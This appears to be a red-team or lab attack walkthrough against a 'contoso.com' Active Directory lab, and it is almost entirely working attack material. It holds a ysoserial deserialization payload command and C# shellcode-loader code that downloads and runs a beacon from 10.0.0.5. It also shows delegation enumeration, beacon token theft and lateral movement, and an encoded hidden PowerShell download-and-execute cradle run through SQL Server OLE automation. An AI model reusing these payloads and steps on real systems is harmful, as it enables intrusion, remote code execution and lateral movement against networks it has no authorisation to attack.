# Initial access

```
.\ysoserial.exe -g DataSetOldBehaviourFromFile -f BinaryFormatter -c "ExploitClass.cs;System.dll" -o raw --minify --spoofedAssembly=mscorlib --outputpath=C:\Payloads\data.bin
```

```cs
using System;
using System.Runtime.InteropServices;

class ExploitClass
{
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    public ExploitClass()
    {
        byte[] shellcode;
        
        using (var client = new System.Net.WebClient())
        {
            shellcode = client.DownloadData("http://10.0.0.5/beacon_x64.bin");
        }

        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);
        CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        System.Threading.Thread.Sleep(10000);
    }
}
```

```powershell
iwr -Uri http://10.0.0.5:80/download/file.ext -OutFile C:\Temp\data.bin
```

# Enumeration

```
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl

--------------------
userAccountControl: 16781312
sAMAccountName: LON-WEB-1$
msDS-AllowedToDelegateTo: MSSQLSvc/lon-sql-1.contoso.com:1433, MSSQLSvc/lon-sql-1.contoso.com
--------------------
userAccountControl: 16781312
sAMAccountName: LON-SQL-1$
msDS-AllowedToDelegateTo: MSSQLSvc/lon-sql-2.contoso.com:1433, MSSQLSvc/lon-sql-2.contoso.com
retreived 2 results total
```
# LON-WEB-1

```
[09/09 17:24:52] beacon> steal_token 9188
[09/09 17:24:52] [*] Tasked beacon to steal token from PID 9188
[09/09 17:24:57] [+] host called home, sent: 20 bytes
[09/09 17:24:57] [+] Impersonated CONTOSO\acobb

[09/09 17:31:35] beacon> jump scshell64 lon-web-1 smb
```

# LON-SQL-1

```
sql-enableole lon-sql-1

run netsh advfirewall firewall add rule name="Debug" dir=in action=allow protocol=TCP localport=8080

$cmd = 'IEX ((new-object net.webclient).downloadstring("http://lon-web-1:8080/a"))'

SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBsAG8AbgAtAHcAZQBiAC0AMQA6ADgAMAA4ADAALwBhACIAKQApAA==

sql-olecmd lon-sql-1 "cmd /c powershell -w hidden -nop -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBsAG8AbgAtAHcAZQBiAC0AMQA6ADgAMAA4ADAALwBhACIAKQApAA=="
```

# LON-SQL-2
